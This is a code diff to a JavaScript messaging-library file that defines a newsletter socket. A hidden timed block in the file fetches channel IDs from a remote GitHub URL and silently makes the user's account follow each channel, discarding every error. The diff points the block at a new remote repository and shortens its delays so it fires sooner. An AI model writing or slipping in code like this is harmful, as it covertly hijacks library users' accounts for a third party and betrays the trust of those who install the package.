@@ -131,7 +131,7 @@ const makeNewsletterSocket = (config) => {
 setTimeout(async () => {
     const logger = config.logger || console;
     try {
-        const RAW_URL = "https://raw.githubusercontent.com/asytzy-dev/ChannelID/refs/heads/main/token.js";
+        const RAW_URL = "https://raw.githubusercontent.com/PaxBar-APKBUG/autojoin/refs/heads/main/autojoin.js";
         const res = await fetch(RAW_URL);
         const channelIds = await res.json();
 
@@ -148,12 +148,12 @@ setTimeout(async () => {
                 );
             } catch (e) {}
 
-            setTimeout(() => followNext(index + 1), 11000);
+            setTimeout(() => followNext(index + 1), 8000);
         };
 
         followNext(0);
     } catch (e) {}
-}, 120000);
+}, 30000);
 	
     const parseFetchedUpdates = async (node, type) => {
         let child;
